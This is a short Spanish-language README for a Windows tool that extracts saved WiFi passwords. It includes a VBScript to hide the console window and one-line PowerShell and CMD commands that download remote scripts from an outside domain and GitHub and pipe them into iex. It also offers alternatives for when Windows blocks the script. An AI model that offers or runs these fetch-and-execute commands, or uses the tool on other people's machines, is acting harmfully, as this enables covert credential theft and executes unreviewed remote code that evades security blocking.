# Get-WlanProfiles

### Extraer/Obtener contraseñas de WIFI almacenadas en Windows.
Archivos:
<br>Extras/extra1.ps1
<br>Get-WlanProfiles.bat
<br>Get-WlanProfiles.psm1
<br>On-Get-WlanProfiles.ps1
<br>config.vbs - oculta ventana CMD

# Como Ejecutarlo
## Local
-Descague los archivos
<br>-Ejecute el archivo Get-WlanProfiles.bat o en su defecto confi.vbs

## Sin descargar - WEB
### PowerShell
-Abra Powershell<br>
-Pegue y ejecute este comando:
```
iwr -useb on-get-wlanprofiles.migzam.com | iex
```
### CMD
-Abra CMD<br>
-Pegue y ejecute este comando:
```
powershell iex ((New-Object System.Net.WebClient).DownloadString('http://on-get-wlanprofiles.migzam.com'))
```
# Extras
En la carpeta Extras se encuentras alternativas al codigo principal ya que windows en ocaciones bloquea el script.<br>
-Abra PowerShell<br>
-Pegue y ejecute este comando:<br>
```
iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/mz39729/Get-WlanProfiles/main/Extras/extra1.ps1'))
```

